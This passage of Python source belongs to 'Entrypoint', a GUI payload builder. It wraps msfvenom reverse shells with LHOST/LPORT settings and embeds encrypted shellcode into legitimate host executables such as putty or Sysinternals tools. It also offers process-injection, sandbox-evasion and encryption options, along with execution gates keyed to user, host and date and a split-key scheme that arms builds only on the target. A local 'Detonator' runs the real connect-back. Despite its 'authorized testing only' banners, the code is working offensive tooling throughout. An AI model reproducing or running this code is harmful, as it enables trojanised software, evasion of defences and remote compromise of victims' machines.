                f"set -e\n{cc} -O2 loader.c -o payload.exe {libs}\n"
                "echo 'built payload.exe — test in your lab first'\n")

    def mac_buildsh(self, cfg, outdir) -> str:
        arch = "-arch arm64" if not cfg.get("x64", True) else "-arch x86_64"
        return ("#!/bin/sh\n# Build on macOS: clang with Hardware-assisted virtualization off for PROT_EXEC\n"
                "set -e\n"
                f"clang {arch} -O2 loader.c -o payload -Wl,-S\n"
                "codesign -s - payload 2>/dev/null || true\n"
                "echo 'built payload — unsigned, Gatekeeper will ask on first run'\n")

    def lin_buildsh(self, cfg, outdir) -> str:
        libs = "-ldl" if cfg.get("kind") == "so" else ""
        return ("#!/bin/sh\n# Entrypoint build script — AUTHORIZED TESTING ONLY\n"
                f"set -e\ngcc -O2 loader.c -o payload.elf {libs}\n"
                "echo 'built payload.elf'\n")

    # -- orchestrator --------------------------------------------------------

    def run(self, cfg) -> str:
        pe_bytes = b""
        if cfg.get("pe_inject"):
            pp = cfg.get("pe_path", "").strip()
            if not pp or not os.path.exists(pp):
                raise EntrypointError("PE injection enabled but no PE file selected")
            pe_bytes = open(pp, "rb").read()
            cfg["pe_name"] = os.path.basename(pp)
            self.log(f"[*] PE injection host: {os.path.basename(pp)} ({len(pe_bytes)} bytes)")

        if cfg["payload_type"] == "MSFvenom":
            cfg["target"] = platform_of(cfg["payload"])
            cfg["kind"] = "shellcode"
            outdir = os.path.join(OUT_DIR, "_stage")
            os.makedirs(outdir, exist_ok=True)
            shellcode = self.run_msfvenom(cfg, outdir)
            if cfg["fmt"] in ("exe", "exe-only", "service", "dll", "msi", "elf", "macho", "so"):
                # msfvenom already wrapped it — ship as-is, no loader needed
                ext = safe_name(cfg["fmt"])
                final = os.path.join(OUT_DIR, safe_name("EP-msf-" + safe_name(cfg["payload"]) + "-" + rnd_hex(2)))
                os.makedirs(final, exist_ok=True)
                shutil.copyfile(os.path.join(outdir, "payload." + ext),
                                os.path.join(final, "payload." + ext))
                open(os.path.join(final, "manifest.json"), "w").write(json.dumps({
                    "build": os.path.basename(final), "target": cfg["target"],
                    "payload": cfg["payload"], "fmt": cfg["fmt"],
                    "lhost": cfg.get("lhost", ""), "lport": cfg.get("lport", ""),
                }, indent=2))
                self.log(f"[+] Binary format requested — shipped as-is (no loader): {final}")
                return final
            if cfg["fmt"] in ("c", "hex", "powershell", "bash", "python"):
                text = open(os.path.join(outdir, "payload." + safe_name(cfg["fmt"])),
                            "rb").read().decode("utf-8", "ignore")
                shellcode = parse_shellcode_text(text)
        else:
            shellcode = self.read_implant(cfg)
            cfg["kind"] = kind_of_implant(cfg["implant_path"])

        # T1055.002 file embedding: patch the payload INTO the host executable
        if pe_bytes and shellcode:
            return self.embed_into_pe(cfg, shellcode, pe_bytes)

        return self.build(cfg, shellcode, pe_bytes)


# ---------------------------------------------------------------------------
# GUI — layout mirrors the reference screenshot
# ---------------------------------------------------------------------------

BG      = "#2d2d30"   # window background
FG      = "#dcdcdc"   # label text
CONSOLE_BG = "#1e1e1e"

class EntrypointGUI:
    def __init__(self, root):
        self.root = root
        self.f = Entrypoint(log=self._log)
        self.q = queue.Queue()
        self.worker = None
        self._authorized = False
        self.last_pe_outdir = ""
        self.detonate_results = None

        root.title(APP_NAME)
        root.geometry("520x660")
        root.minsize(500, 620)
        root.configure(bg=BG)

        s = ttk.Style()
        try:
            s.theme_use("clam")
        except Exception:
            pass
        s.configure(".", background=BG, foreground=FG,
                    fieldbackground="#3c3c3c", troughcolor="#3c3c3c",
                    bordercolor="#454545", lightcolor="#454545",
                    darkcolor="#2d2d30", selectbackground="#0960a5")
        s.configure("TCombobox", fieldbackground="#3c3c3c", foreground="#000000")
        s.configure("TCheckbutton", background=BG, foreground=FG)
        s.configure("TLabel", background=BG, foreground=FG)
        s.configure("TFrame", background=BG)
        s.configure("TButton", background="#3c3c3c", foreground="#ffffff")
        s.map("TButton", background=[("active", "#0960a5")])

        pad = {"padx": 12, "pady": 3}
        frm = ttk.Frame(root)
        frm.pack(fill="both", expand=True)
        frm.columnconfigure(1, weight=1)

        def lbl(text, row, col=0, sticky="w"):
            ttk.Label(frm, text=text).grid(row=row, column=col, sticky=sticky, **pad)
            return None

        def combo(var, values, row, col=1, width=30):
            cb = ttk.Combobox(frm, textvariable=var, values=values,
                              state="readonly", width=width)
            cb.grid(row=row, column=col, sticky="we", **pad)
            return cb

        # Row 0 — Payload Type
        self.payload_type = tk.StringVar(value="MSFvenom")
        lbl("Payload Type:", 0)
        cb = combo(self.payload_type, ["MSFvenom", "Custom (C2 implant)"], 0)
        cb.bind("<<ComboboxSelected>>", lambda e: self._on_type())

        # Row 1 — msfvenom payload picker (disabled when Custom)
        self.msf_var = tk.StringVar(value=MSF_PAYLOADS[0])
        lbl("Choose MSFvenom payload:", 1)
        self.cb_msf = combo(self.msf_var, MSF_PAYLOADS, 1)

        # Row 2+3 — LHOST / LPORT side by side (two inner frames)
        self.lhost = tk.StringVar(value="192.168.64.128")
        self.lport = tk.StringVar(value="4444")
        lh = ttk.Frame(frm); lh.grid(row=2, column=0, columnspan=2, sticky="we", **pad)
        lh.columnconfigure(1, weight=1); lh.columnconfigure(3, weight=0)
        ttk.Label(lh, text="LHOST:").grid(row=0, column=0, sticky="w")
        ttk.Entry(lh, textvariable=self.lhost, width=20).grid(row=0, column=1, sticky="we", padx=(4, 16))
        ttk.Label(lh, text="LPORT:").grid(row=0, column=2, sticky="e")
        ttk.Entry(lh, textvariable=self.lport, width=8).grid(row=0, column=3, sticky="e", padx=(4, 0))

        # Row 3 — Process Injection
        self.injection = tk.StringVar(value=INJECTION_OPTIONS[1])
        lbl("Process Injection Technique (T1055):", 3)
        combo(self.injection, INJECTION_OPTIONS, 3)

        # Row 4 — PE injection checkbox (matches screenshot)
        self.pe_inject = tk.BooleanVar(value=False)
        ttk.Checkbutton(frm, text="Portable Executable Injection (T1055.002):  " + PE_INJ_FLAG,
                        variable=self.pe_inject,
                        command=self._on_pe_toggle).grid(row=4, column=0, columnspan=2,
                                                          sticky="w", **pad)

        # Row 6 — PE path + Browse (shown only when checkbox on)
        self.pe_path = tk.StringVar(value="")
        self.lbl_pe = ttk.Label(frm, text="Path to PE file:")
        self.ent_pe = ttk.Entry(frm, textvariable=self.pe_path)
        self.btn_pe = ttk.Button(frm, text="Browse", width=10, command=self._browse_pe)

        # Static rows below the optional ones — all gridded by _relayout()
        self.enc = tk.StringVar(value=ENC_OPTIONS[1])
        self.lbl_enc = ttk.Label(frm, text="Payload Encryption:")
        self.cb_enc = ttk.Combobox(frm, textvariable=self.enc, values=ENC_OPTIONS,
                                   state="readonly", width=24)

        self.evasion = tk.StringVar(value=EVASION_OPTIONS[2])
        self.lbl_eva = ttk.Label(frm, text="Sandbox Evasion Technique:")
        self.cb_eva = ttk.Combobox(frm, textvariable=self.evasion, values=EVASION_OPTIONS,
                                   state="readonly", width=24)

        self.x64 = tk.BooleanVar(value=True)
        self.chk_x64 = ttk.Checkbutton(frm, text="Use x64 payload", variable=self.x64)

        self.lbl_con = ttk.Label(frm, text="Building Console")
        self.console = tk.Text(frm, height=11, bg=CONSOLE_BG, fg="#cccccc",
                               insertbackground="#cccccc", state="disabled",
                               wrap="word", relief="flat", padx=6, pady=4)

        self.btn_gen = ttk.Button(frm, text="Generate", command=self._generate)

        # Lab Detonator — safe local test fire of the last build
        self.detonate_var = tk.BooleanVar(value=False)
        self.split_var = tk.BooleanVar(value=False)
        self.chk_detonate = ttk.Checkbutton(frm, text="Detonate after build",
                                            variable=self.detonate_var)
        self.btn_detonate = ttk.Button(frm, text="Detonate last build",
                                       command=self._detonate)
        # Split-key delivery — ship the build keyless, arm it on target
        self.chk_split = ttk.Checkbutton(frm, text="Split-key delivery",
                                         variable=self.split_var)
        # Execution gates — stage stays dormant unless its checks pass
        self.gates_cfg = None
        self.btn_gates = ttk.Button(frm, text="Execution gates\u2026",
                                    command=self._pick_gates)
        self.lbl_gates = ttk.Label(frm, text="gates: off")

        # Quick way to the real output folder (dot-folder next to state.json —
        # not the git clone, where users instinctively browse first)
        self.btn_reveal = ttk.Button(frm, text="Reveal builds folder",
                                     command=self._reveal_builds)

        # Persona-based host presets — one click fills a known-good PE host
        self.hostpreset_var = tk.StringVar(value="")
        self.btn_hostpreset = ttk.Button(frm, text="Host presets…",
                                         command=self._pick_host_preset)

        # Implant row — created but not gridded; shown when Payload Type = Custom
        self.implant_var = tk.StringVar(value="")
        self.lbl_impl = ttk.Label(frm, text="Implant file:")
        self.ent_impl = ttk.Entry(frm, textvariable=self.implant_var)
        self.btn_impl = ttk.Button(frm, text="Browse", width=10, command=self._browse_implant)

        # Target OS row — only relevant for Custom implants (msfvenom derives
        # the platform from the payload name)
        self.target_var = tk.StringVar(value="Linux")
        self.lbl_target = ttk.Label(frm, text="Target OS:")
        self.cb_target = ttk.Combobox(frm, textvariable=self.target_var,
                                      values=["Windows", "Linux", "macOS"],
                                      state="readonly", width=24)

        # msfvenom format row — also hidden until needed
        self.fmt_var = tk.StringVar(value="raw")
        self.lbl_fmt = ttk.Label(frm, text="MSFvenom -f format:")
        self.cb_fmt = ttk.Combobox(frm, textvariable=self.fmt_var,
                                   values=MSF_FORMATS["Linux"], state="readonly", width=24)

        self._log("[*] Entrypoint ready — AUTHORIZED TESTING ONLY")
        self._log(f"[*] Builds folder: {OUT_DIR}")
        self._on_type()
        self._poll()

    # -- UI callbacks ---------------------------------------------------------

    def _on_type(self):
        t = self.payload_type.get()
        is_msf = (t == "MSFvenom")
        self.cb_msf.configure(state="readonly" if is_msf else "disabled")
        self._relayout()
        self._on_payload()

    def _on_pe_toggle(self):
        self._relayout()

    def _on_payload(self):
        fmts = MSF_FORMATS.get(platform_of(self.msf_var.get()), ["raw"])
        self.cb_fmt.configure(values=fmts)
        if self.fmt_var.get() not in fmts:
            self.fmt_var.set(fmts[0])

    def _relayout(self):
        """Place every row from the optional block down, in toggle order.
        Optional rows (format / implant / target / PE path) appear inline and
        push the static rows (encryption, evasion, x64, console, generate)
        down, so nothing ever overlaps."""
        pad = {"padx": 12, "pady": 3}
        frm = self.console.master
        r = 5
        is_msf = (self.payload_type.get() == "MSFvenom")
        is_custom = (self.payload_type.get() == "Custom (C2 implant)")
        pe_on = self.pe_inject.get()

        if is_msf:
            self.lbl_fmt.grid(row=r, column=0, sticky="w", **pad)
            self.cb_fmt.grid(row=r, column=1, sticky="we", **pad)
            r += 1
        else:
            self.lbl_fmt.grid_forget(); self.cb_fmt.grid_forget()

        if is_custom:
            self.lbl_impl.grid(row=r, column=0, sticky="w", **pad)
            self.ent_impl.grid(row=r, column=1, sticky="we", **pad)
            self.btn_impl.grid(row=r, column=2, sticky="e", padx=(6, 12), pady=3)
            r += 1
            self.lbl_target.grid(row=r, column=0, sticky="w", **pad)
            self.cb_target.grid(row=r, column=1, sticky="we", **pad)
            r += 1
        else:
            for w in (self.lbl_impl, self.ent_impl, self.btn_impl,
                      self.lbl_target, self.cb_target):
                w.grid_forget()

        if pe_on:
            self.lbl_pe.grid(row=r, column=0, sticky="w", **pad)
            self.ent_pe.grid(row=r, column=1, sticky="we", **pad)
            self.btn_pe.grid(row=r, column=2, sticky="e", padx=(6, 12), pady=3)
            r += 1
            self.btn_hostpreset.grid(row=r, column=1, sticky="w", **pad)
            r += 1
        else:
            for w in (self.lbl_pe, self.ent_pe, self.btn_pe):
                w.grid_forget()
            self.btn_hostpreset.grid_forget()

        # static rows follow in fixed order
        self.lbl_enc.grid(row=r, column=0, sticky="w", **pad)
        self.cb_enc.grid(row=r, column=1, sticky="we", **pad); r += 1
        self.lbl_eva.grid(row=r, column=0, sticky="w", **pad)
        self.cb_eva.grid(row=r, column=1, sticky="we", **pad); r += 1
        self.chk_x64.grid(row=r, column=0, columnspan=2, sticky="w", **pad); r += 1
        self.lbl_con.grid(row=r, column=0, sticky="w", **pad)
        self.btn_reveal.grid(row=r, column=1, sticky="e", **pad); r += 1
        self.console.grid(row=r, column=0, columnspan=2, sticky="nsew", **pad)
        if getattr(self, "_console_row", None) not in (None, r):
            frm.rowconfigure(self._console_row, weight=0)
        frm.rowconfigure(r, weight=1)
        self._console_row = r
        r += 1
        self.btn_gen.grid(row=r, column=0, columnspan=2, sticky="ew", **pad)
        r += 1
        self.chk_detonate.grid(row=r, column=0, sticky="w", **pad)
        self.btn_detonate.grid(row=r, column=1, sticky="e", **pad)
        self.chk_split.grid(row=r, column=2, sticky="w", **pad)
        r += 1
        self.btn_gates.grid(row=r, column=0, columnspan=2, sticky="w", **pad)
        self.lbl_gates.grid(row=r, column=2, sticky="w", **pad)

    def _browse_implant(self):
        p = filedialog.askopenfilename(
            title="Pick C2 implant",
            filetypes=[("C2 implants", "*.bin *.raw *.so *.exe *.dll *.macho *.c *.hex *.txt"),
                       ("All files", "*.*")])
        if p:
            self.implant_var.set(p)
            ext = os.path.splitext(p)[1].lower()
            kind = kind_of_implant(p)
            if kind == "shellcode":
                pass
            elif ext == ".so":
                self.target_var.set("Linux")
            elif ext == ".macho":
                self.target_var.set("macOS")
            elif ext in (".exe", ".dll"):
                self.target_var.set("Windows")
            self._log(f"[i] Implant kind: {kind}")

    def _browse_pe(self):
        p = filedialog.askopenfilename(
            title="Pick host executable for PE injection",
            filetypes=[("Executables", "*.exe *.dll"), ("All files", "*.*")])
        if p:
            self.pe_path.set(p)

    def _pick_host_preset(self):
        """Persona-bucketed host picker: pick a bucket, then a host found on
        this machine; the path lands in the PE field and the arch is sniffed
        and logged. Empty buckets are hidden — only what exists is offered."""
        choices = {}
        for bucket, entries in HOST_PRESETS.items():
            for lbl, paths, fname in entries:
                for d in paths:
                    p = os.path.join(d, fname)
                    if os.path.isfile(p):
                        try:
                            with open(p, "rb") as fh:
                                head = fh.read(0x400)
                            if head[:2] != b"MZ":
                                continue
                            lf = int.from_bytes(head[0x3C:0x40], "little")
                            if head[lf:lf + 4] != b"PE\x00\x00":
                                continue
                            machine = int.from_bytes(head[lf + 4:lf + 6], "little")
                            if machine not in (0x8664, 0x014C):
                                continue
                        except OSError:
                            continue
                        arch = "x64" if machine == 0x8664 else "x86"
                        choices[f"{bucket}  ›  {lbl}  ({arch})"] = p
                        break
        if not choices:
            messagebox.showinfo(
                APP_NAME,
                "No preset hosts found on this machine.\n"
                "Install putty/Sysinternals to %LOCALAPPDATA%, or just Browse "
                "to any exe (e.g. C:\\Windows\\System32\\whoami.exe).")
            return
        pick = _HostPresetDialog(self.root, "Pick a PE host", choices)
        if pick and pick in choices:
            p = choices[pick]
            self.pe_path.set(p)
            self._log(f"[*] Host preset: {os.path.basename(p)} ({len(open(p,'rb').read())} bytes)")
            try:
                head = open(p, "rb").read(0x400)
                lf = int.from_bytes(head[0x3C:0x40], "little")
                machine = int.from_bytes(head[lf + 4:lf + 6], "little")
                self._log("[i] " + ("x64 host: use 64-bit shellcode to match"
                                    if machine == 0x8664 else
                                    "x86 (32-bit) host: pair with 32-bit shellcode"))
            except OSError:
                pass

    def _reveal_builds(self):
        """Open the builds output folder in the file manager. Builds land in
        the dot-folder (~/.entrypoint/builds) next to state.json — not in
        the git clone — so users grab deliverables from the right place."""
        try:
            opener = open_in_file_manager(OUT_DIR)
        except Exception as e:
            messagebox.showerror(APP_NAME,
                                 f"Couldn't open the builds folder:\n{OUT_DIR}\n\n{e}")
            return
        self._log(f"[*] Opened builds folder via {opener}: {OUT_DIR}")

    def _log(self, msg):
        self.q.put(msg)

    def _poll(self):
        try:
            while True:
                msg = self.q.get_nowait()
                self.console.configure(state="normal")
                self.console.insert("end", msg + "\n")
                self.console.see("end")
                self.console.configure(state="disabled")
                if self.detonate_results:
                    results, self.detonate_results = self.detonate_results, None
                    _DetonateDialog(self.root, results)
        except queue.Empty:
            pass
        self.root.after(120, self._poll)

    def _generate(self):
        if self.worker and self.worker.is_alive():
            messagebox.showwarning(APP_NAME, "A build is already running.")
            return
        if not self._authorized:
            if not messagebox.askyesno(
                    APP_NAME,
                    "Confirm you have written authorization for the targets "
                    "you are about to attack. Continue?"):
                self._log("[!] Build cancelled — no authorization confirmed.")
                return
            self._authorized = True
            self._log("[i] Authorization confirmed for this session.")

        cfg = {
            "payload_type": self.payload_type.get(),
            "payload": self.msf_var.get(),
            "implant_path": self.implant_var.get(),
            "lhost": self.lhost.get().strip(),
            "lport": self.lport.get().strip(),
            "injection": self.injection.get(),
            "pe_inject": self.pe_inject.get(),
            "pe_path": self.pe_path.get(),
            "enc": self.enc.get(),
            "evasion": self.evasion.get(),
            "x64": self.x64.get(),
            "fmt": self.fmt_var.get(),
            "target": self.target_var.get(),
            "split_delivery": self.split_var.get(),
            "gates": self.gates_cfg,
        }
        self._run_bg(cfg)

    def _run_bg(self, cfg):
        def work():
            try:
                outdir = self.f.run(cfg)
                self._log(f"[+] Build directory: {outdir}")
                if cfg.get("pe_inject"):
                    self.last_pe_outdir = outdir
                    if self.detonate_var.get():
                        out = detonate_report(outdir, lport=DETONATE_PORT,
                                                     log=self._log)
                        self.detonate_results = out
                        self._log("[+] Detonation complete — see report window.")
            except EntrypointError as e:
                self._log(f"[!] {e}")
            except Exception as e:
                self._log(f"[!] unexpected: {type(e).__name__}: {e}")
        self.worker = threading.Thread(target=work, daemon=True)
        self.worker.start()

    def _detonate(self):
        """Lab-only test fire of the last PE-embed build: three escalating
        modes — smoke decoy, ud2 execution proof, real loopback connect-back."""
        if self.worker and self.worker.is_alive():
            messagebox.showwarning(APP_NAME, "A build is already running.")
            return
        if not self._authorized:
            if not messagebox.askyesno(
                    APP_NAME,
                    "The Detonator runs the real payload against 127.0.0.1 "
                    "in connect mode.\nConfirm you have written authorization "
                    "for local lab testing. Continue?"):
                self._log("[!] Detonation cancelled — no authorization confirmed.")
                return
            self._authorized = True
            self._log("[i] Authorization confirmed for this session.")
        if not self.last_pe_outdir:
            messagebox.showinfo(APP_NAME,
                                "No PE-embed build yet — generate one first "
                                "(tick PE injection and pick a host exe).")
            return
        if not messagebox.askyesno(
                APP_NAME,
                "Run the Lab Detonator on the last build?\n\n"
                "smoke   — decoy stage, host must run clean\n"
                "ud2     — stage must crash 0xC000001D (proof it executes)\n"
                "connect — REAL payload calls 127.0.0.1:%d\n\n"
                "Lab use only." % DETONATE_PORT):
            return

        outdir, lport = self.last_pe_outdir, DETONATE_PORT

        def work():
            try:
                self.detonate_results = detonate_report(
                    outdir, lport=lport, log=self._log)
                self._log("[+] Detonation complete — see report window.")
            except EntrypointError as e:
                self._log(f"[!] {e}")
            except Exception as e:
                self._log(f"[!] unexpected: {type(e).__name__}: {e}")
        self.worker = threading.Thread(target=work, daemon=True)
        self.worker.start()

    def _pick_gates(self):
        """Execution gates editor: activation window + user/host locks."""
        dlg = _GatesDialog(self.root, self.gates_cfg)
        if dlg.applied:
            self.gates_cfg = dlg.result
            on = ([] if not self.gates_cfg else
                  (["time"] if self.gates_cfg.get("time") else [])
                  + (["user"] if self.gates_cfg.get("user") else [])
                  + (["host"] if self.gates_cfg.get("host") else []))
            self.lbl_gates.config(text="gates: "
                                       + (", ".join(on) if on else "off"))


class _GatesDialog:
    """Modal execution-gates editor. .applied=True after Apply (use
    .result, None = gates off); untouched on Cancel."""

    def __init__(self, parent, gates):
        self.result = None
        self.applied = False
        win = tk.Toplevel(parent)
        self.win = win
        win.title("Execution gates")
        win.transient(parent)
        win.grab_set()
        win.resizable(False, False)
        frm = ttk.Frame(win, padding=12)
        frm.pack(fill="both", expand=True)
        ttk.Label(frm, text="The stage fires only when every enabled gate\n"
                            "passes \u2014 otherwise the thread exits and the\n"
                            "host runs clean.").pack(anchor="w")
        self.var_time = tk.BooleanVar(value=bool(gates and gates.get("time")))
        ttk.Checkbutton(frm, text="Time window (inclusive, UTC dates)",
                        variable=self.var_time).pack(anchor="w", pady=(8, 2))
        rowt = ttk.Frame(frm)
        rowt.pack(anchor="w")
        self.ent_from = ttk.Entry(rowt, width=12)
        self.ent_to = ttk.Entry(rowt, width=12)
        if gates and gates.get("time"):
            self.ent_from.insert(0, gates["time"][0])
            self.ent_to.insert(0, gates["time"][1])
        ttk.Label(rowt, text="from").pack(side="left")
        self.ent_from.pack(side="left", padx=4)
        ttk.Label(rowt, text="to (YYYY-MM-DD)").pack(side="left", padx=(4, 0))
        self.ent_to.pack(side="left", padx=4)
        rowu = ttk.Frame(frm)
        rowu.pack(anchor="w", pady=(8, 0))
        ttk.Label(rowu, text="User lock (USERNAME):").pack(side="left")
        self.ent_user = ttk.Entry(rowu, width=20)
        self.ent_user.insert(0, (gates or {}).get("user", ""))
        self.ent_user.pack(side="left", padx=4)
        rowh = ttk.Frame(frm)
        rowh.pack(anchor="w", pady=(2, 0))
        ttk.Label(rowh, text="Host lock (COMPUTERNAME):").pack(side="left")
        self.ent_host = ttk.Entry(rowh, width=20)
        self.ent_host.insert(0, (gates or {}).get("host", ""))
        self.ent_host.pack(side="left", padx=4)
        btns = ttk.Frame(frm)
        btns.pack(fill="x", pady=(12, 0))
        ttk.Button(btns, text="Clear all", command=self._clear).pack(side="left", padx=4)
        ttk.Button(btns, text="Cancel", command=self._cancel).pack(side="right", padx=4)
        ttk.Button(btns, text="Apply", command=self._ok).pack(side="right", padx=4)
        win.bind("<Escape>", lambda e: self._cancel())
        win.wait_window()

    def _clear(self):
        self.var_time.set(False)
        for e in (self.ent_from, self.ent_to, self.ent_user, self.ent_host):
            e.delete(0, "end")

    def _ok(self):
        from datetime import date as dt_date
        g = {"time": None, "user": self.ent_user.get().strip(),
             "host": self.ent_host.get().strip()}
        if self.var_time.get():
            try:
                a = dt_date.fromisoformat(self.ent_from.get().strip())
                b = dt_date.fromisoformat(self.ent_to.get().strip())
            except ValueError:
                messagebox.showerror("Execution gates",
                                     "Dates must be YYYY-MM-DD.")
                return
            if a > b:
                messagebox.showerror("Execution gates",
                                     "Window start is after its end.")
                return
            g["time"] = (a.isoformat(), b.isoformat())
        self.result = (g if (g["time"] or g["user"] or g["host"]) else None)
        self.applied = True
        self.win.destroy()

    def _cancel(self):
        self.win.destroy()


class _DetonateDialog:
    """Modal detonation report — shows the three-mode matrix after a run."""

    def __init__(self, parent, results, title="Lab Detonator report"):
        win = tk.Toplevel(parent)
        self.win = win
        win.title(title)
        win.transient(parent)
        win.grab_set()
        win.resizable(False, False)
        frm = ttk.Frame(win, padding=12)
        frm.pack(fill="both", expand=True)
        ttk.Label(frm, text="Detonation results (lab only):").pack(anchor="w")
        box = tk.Text(frm, width=64, height=10, bg=CONSOLE_BG, fg="#cccccc",
                      relief="flat", padx=6, pady=4)
        for m, r in results.items():
            mark = "FIRED " if r["fired"] else "no fire"
            box.insert("end", f"[{m:>7}] exit={r['exit_code']}  {mark}\n"
                              f"          {r['detail']}\n")
        box.configure(state="disabled")
        box.pack(fill="both", expand=True, pady=(6, 10))
        ttk.Button(frm, text="Close", command=win.destroy).pack(anchor="e")
        win.wait_window()



class _HostPresetDialog:
    """Tiny modal chooser — a listbox of "bucket › label (arch)" entries.
    Returns the chosen key via .result ("" = cancelled). No toplevel geometry
    guessing: transient to the parent, centered by Tk."""

    def __init__(self, parent, title, choices):
        self.result = ""
        win = tk.Toplevel(parent)
        self.win = win
        win.title(title)
        win.transient(parent)
        win.grab_set()
        win.resizable(False, False)
        frm = ttk.Frame(win, padding=10)
        frm.pack(fill="both", expand=True)
        ttk.Label(frm, text="Found on this machine:").pack(anchor="w")
        lb = tk.Listbox(frm, width=52, height=min(14, max(4, len(choices))),
                        activestyle="dotbox")
        for key in sorted(choices):
            lb.insert("end", key)
        lb.pack(fill="both", expand=True, pady=(6, 10))
        lb.selection_set(0)
        btns = ttk.Frame(frm)
        btns.pack(fill="x")
        ttk.Button(btns, text="Cancel", command=self._cancel).pack(side="right", padx=4)
        ttk.Button(btns, text="Use host", command=self._ok).pack(side="right", padx=4)
        lb.bind("<Double-Button-1>", lambda e: self._ok())
        win.bind("<Return>", lambda e: self._ok())
        win.bind("<Escape>", lambda e: self._cancel())

        self.lb = lb
        self.choices = choices
        win.wait_window()

    def _ok(self):
        sel = self.lb.curselection()
        if sel:
            self.result = self.lb.get(sel[0])
        self.win.destroy()

    def _cancel(self):
        self.win.destroy()


def launch_gui():
    """Open the main window immediately. The authorization gate fires inside
    _generate() on first use — no modal before mainloop, which some Windows
    setups render invisibly and leave the app looking dead."""
    if not TK_OK:
        print("tkinter not available — install python3-tk (Kali: sudo apt install python3-tk)")
        return 1
    root = tk.Tk()

    def _log_cb_exc(exc_type, exc_value, exc_tb):
        """Tkinter swallows exceptions raised inside callbacks — they never
        reach main()'s try/except and die on stderr, which is invisible when
        the app is launched detached. Route them into crash.log instead."""
        import traceback as tb
        log = os.path.join(STATE_DIR, "crash.log")
        os.makedirs(STATE_DIR, exist_ok=True)
        with open(log, "a") as fh:
            fh.write("\n" + time.strftime("%Y-%m-%d %H:%M:%S") + " (GUI callback)\n")
            tb.print_exception(exc_type, exc_value, exc_tb, file=fh)

    root.report_callback_exception = _log_cb_exc

    EntrypointGUI(root)
    # make sure the window is on-screen and front-and-center
    root.update_idletasks()
    w, h = 520, 660
    x = (root.winfo_screenwidth() - w) // 2
    y = max(0, (root.winfo_screenheight() - h) // 3)
    root.geometry(f"{w}x{h}+{x}+{y}")
    root.lift()
    root.focus_force()
    root.attributes("-topmost", True)
    root.after(250, lambda: root.attributes("-topmost", False))
    root.mainloop()
    return 0


DETONATE_PORT = 4444           # loopback port the Lab Detonator listens on


# ---------------------------------------------------------------------------
# Lab Detonator — safe local test harness for finished builds.
# Productizes the ud2/live-fire method used to validate the PE-embed stubs:
# it runs a build in three escalating modes and reports what actually fired.
#
#   smoke   — run the build with a decoy payload (EB FE self-jump) patched
#             over the stage: proves decrypt→thread→OEP without running any
#             real payload. Host either exits normally (stub + OEP intact)
#             or dies with a distinctive exit code the harness recognizes.
#   ud2     — stage replaced with an illegal instruction (0F 0B): the host
#             must die with STATUS_ILLEGAL_INSTRUCTION (C000001D). This is
#             the end-to-end proof that the stub decrypted and STARTED the
#             stage. Exit 0 would mean the stub never ran the payload.
#   connect — the build's real stage runs against a loopback listener on
#             the configured LPORT; the harness counts the connect-back.
#             Only meaningful for reverse-shell payloads. LAB USE ONLY.
# ---------------------------------------------------------------------------

DECOY_HANG = b"\xEB\xFE"     # jmp $ — never returns, distinctive under a debugger
DECOY_UD2 = b"\x0F\x0B"      # illegal instruction → STATUS_ILLEGAL_INSTRUCTION
EXIT_ILLEGAL = 0xC000001D    # 3221225785


def _find_entp_stage(patched: bytes):
    """Locate the .entp section in a patched PE: returns (raw_offset, enc_len,
    key_off, stub_off, stub_len) or None. Reuses the selftest's stub-locator
    logic (first 8 stub bytes at a 16-aligned offset)."""
    lf = struct.unpack_from("<I", patched, 0x3C)[0]
    nsec = struct.unpack_from("<H", patched, lf + 6)[0]
    soh = struct.unpack_from("<H", patched, lf + 20)[0]
    first = lf + 24 + soh
    for i in range(nsec):
        h = first + i * 40
        if bytes(patched[h:h + 8]).rstrip(b"\x00") != b".entp":
            continue
        vsz, _va, _rsz, rawp = struct.unpack_from("<IIII", patched, h + 8)
        stage = bytes(patched[rawp:rawp + vsz])
        # @24/@28 park enc_len / key_off (written by patch_pe) — the exact,
        # heuristic-free path. Zero-walk fallback for older builds.
        rec_len = struct.unpack_from("<I", patched, h + 24)[0]
        rec_off = struct.unpack_from("<I", patched, h + 28)[0]
        if rec_len and rec_off == rec_len and 0 < rec_len < vsz:
            for tmpl in (PE_STUB_TEMPLATE, PE_STUB_TEMPLATE_X86):
                stub_at = stage.find(tmpl[:8])
                if 0 < stub_at < vsz - 8 and stub_at % 16 == 0:
                    return (rawp, rec_len, rec_off, stub_at, len(tmpl))
        for tmpl in (PE_STUB_TEMPLATE, PE_STUB_TEMPLATE_X86):
            stub_at = next((o for o in range(16, len(stage) - 8, 16)
                            if stage[o:o + 8] == tmpl[:8]), -1)
            if stub_at >= 16:
                # Exact stage layout: enc + key end where the zero padding to
                # the 16-aligned stub begins. Count the zeros back from the
                # stub to find the key's end, then enc_len = key_end - 16.
                # (An aligned guess alone would overwrite key bytes when the
                # payload length is not 16-aligned — the decoy swap must be
                # byte-exact or the stub decrypts garbage.)
                p = stub_at
                while p > 32 and stage[p - 1] == 0:
                    p -= 1
                enc_len = p - 16
                if enc_len <= 0:
                    continue
                return (rawp, enc_len, enc_len, enc_len, len(tmpl))
    return None


# ---------------------------------------------------------------------------
# Split-key delivery — payload and key never travel together (T1027-era
# staging). The forged exe is built with its 16-byte stage key ZEROED: it is
# inert on the target until an arming script re-plants the key. The operator
# holds the key out of band (inline paste, hex side file, NTFS alternate data
# stream, or registry value) and the arming script verifies the artifact's
# SHA-256 before touching a byte, so the exe cannot be quietly swapped in
# transit. LAB USE ONLY.
# ---------------------------------------------------------------------------

KEY_SLOT_LEN = 16


def zero_stage_key(patched: bytes) -> bytes:
    """Return a copy of a PE-embed build with the .entp stage key zeroed."""
    loc = _find_entp_stage(patched)
    if not loc:
        raise EntrypointError("zero_stage_key: no .entp stage found")
    rawp, enc_len, key_off, stub_off, stub_len = loc
    z = bytearray(patched)
    z[rawp + key_off: rawp + key_off + KEY_SLOT_LEN] = b"\x00" * KEY_SLOT_LEN
    return bytes(z)


def arm_stage_key(zeroed: bytes, key: bytes) -> bytes:
    """Inverse of zero_stage_key: re-plant a 16-byte key over the zeroed slot."""
    if len(key) != KEY_SLOT_LEN:
        raise EntrypointError("arm_stage_key: key must be exactly 16 bytes")
    loc = _find_entp_stage(zeroed)
    if not loc:
        raise EntrypointError("arm_stage_key: no .entp stage found")
    rawp, enc_len, key_off, stub_off, stub_len = loc
    a = bytearray(zeroed)
    a[rawp + key_off: rawp + key_off + KEY_SLOT_LEN] = key
    return bytes(a)


def split_key_script(exe_path: str, sha256_hex: str, build_id: str,
